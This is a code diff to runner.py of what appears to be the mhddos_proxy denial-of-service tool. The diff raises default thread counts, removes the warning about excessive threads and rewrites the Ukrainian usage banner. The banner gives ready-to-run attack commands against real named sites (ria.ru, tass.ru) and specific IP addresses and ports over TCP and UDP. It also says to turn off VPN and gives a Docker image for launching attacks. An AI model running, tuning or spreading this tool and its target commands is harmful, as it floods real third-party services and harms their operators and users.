@@ -1,12 +1,12 @@
 import argparse
 import json
-import multiprocessing
 import os
 import random
 import subprocess
 import sys
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from multiprocessing import cpu_count
 
 import requests
 from MHDDoS.start import ProxyManager, logger
@@ -15,9 +15,10 @@ from PyRoxy import ProxyType, Proxy
 
 PROXY_TIMEOUT = 5
 UDP_THREADS = 1
-
-HIGH_THREADS = 5000
 LOW_RPC = 1000
+
+THREADS_PER_CORE = 1000
+MAX_DEFAULT_THREADS = 4000
 
 
 class Targets:
@@ -67,7 +68,7 @@ def remove_duplicates(proxies):
     return [Proxy(*pargs) for pargs in set(proxy_tuples)]
 
 
-def update_proxies(period, targets, total_threads):
+def update_proxies(period, targets):
     #  Avoid parsing proxies too often when restart happens
     if os.path.exists('files/proxies/proxies.txt'):
         last_update = os.path.getmtime('files/proxies/proxies.txt')
@@ -84,7 +85,7 @@ def update_proxies(period, targets, total_threads):
     logger.info(f'{len(Proxies):,} проксі перевіряється на працездатність - це може зайняти пару хвилин:')
 
     future_to_proxy = {}
-    with ThreadPoolExecutor(min(1000, total_threads)) as executor:
+    with ThreadPoolExecutor(THREADS_PER_CORE) as executor:
         for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
             future_to_proxy.update({
                 executor.submit(proxy.check, target, PROXY_TIMEOUT): proxy
@@ -162,12 +163,6 @@ def start(total_threads, period, targets, rpc, http_methods, debug):
             logger.error('Must provide either targets or a valid config file')
             exit()
 
-        if total_threads > HIGH_THREADS:
-            logger.warning(
-                f'Загальна кількість потоків перевищує {HIGH_THREADS}. '
-                f'Це може призвести до перевантаження системи та/або падіння продуктивності.'
-            )
-
         if rpc < LOW_RPC:
             logger.warning(
                 f'RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
@@ -176,7 +171,7 @@ def start(total_threads, period, targets, rpc, http_methods, debug):
 
         no_proxies = all(target.lower().startswith('udp://') for target in resolved)
         if not no_proxies:
-            update_proxies(period, resolved, total_threads)
+            update_proxies(period, resolved)
         run_ddos(resolved, total_threads, period, rpc, http_methods, debug)
 
 
@@ -196,8 +191,8 @@ def init_argparse() -> argparse.ArgumentParser:
         '-t',
         '--threads',
         type=int,
-        default=300,
-        help='Threads per CPU Core (default is 300)',
+        default=min(THREADS_PER_CORE * cpu_count(), MAX_DEFAULT_THREADS),
+        help='Total number of threads to run (default is CPU * 1000)',
     )
     parser.add_argument(
         '-p',
@@ -231,20 +226,22 @@ def print_banner():
     print('''\
                             !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
      (скрипт автоматично підбирає проксі, VPN тільки заважає як додатковий прошарок)
-# Варіанти цілей
+
+# Конфігурація. Усі параметри можна комбінувати, можна вказувати і до і після переліку цілей.
+Для Docker замініть `python3 runner.py` на `docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest`
+
+- Повна документація - `python3 runner.py --help` 
+- Навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
+    python3 runner.py -t 3000 https://ria.ru tcp://194.54.14.131:22
+- Інформація про хід атаки - прапорець `--debug`
+    python3 runner.py --debug https://ria.ru tcp://194.54.14.131:22
+- Частота оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
+    python3 runner.py -p 1200 https://ria.ru tcp://194.54.14.131:22
+# Варіанти цілей (перші три можна змішувати в одній команді)
 - URL         https://ria.ru
 - IP + PORT   5.188.56.124:3606
 - TCP         tcp://194.54.14.131:22
 - UDP         udp://217.175.155.100:53 - !!!ДЛЯ ЦЬОГО ПОТРІБЕН VPN!!!
-# Конфігурація. Усі параметри можна комбінувати, можна вказувати і до і після переліку цілей.
-Для Docker замініть `python3 runner.py` на `docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest`
-- Повна документація - `python3 runner.py --help` 
-- Навантаження - `-t XXX` - кількість потоків на кожне ядро CPU, за замовчуванням - 300
-    python3 runner.py -t 500 https://ria.ru https://tass.ru
-- Інформація про хід атаки - прапорець `--debug`
-    python3 runner.py --debug https://ria.ru https://tass.ru
-- Частота оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
-    python3 runner.py -p 1200 https://ria.ru https://tass.ru
                           !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
     ''')
 
@@ -253,7 +250,7 @@ if __name__ == '__main__':
     args = init_argparse().parse_args()
     print_banner()
     start(
-        args.threads * multiprocessing.cpu_count(),
+        args.threads,
         args.period,
         Targets(args.targets, args.config),
         args.rpc,
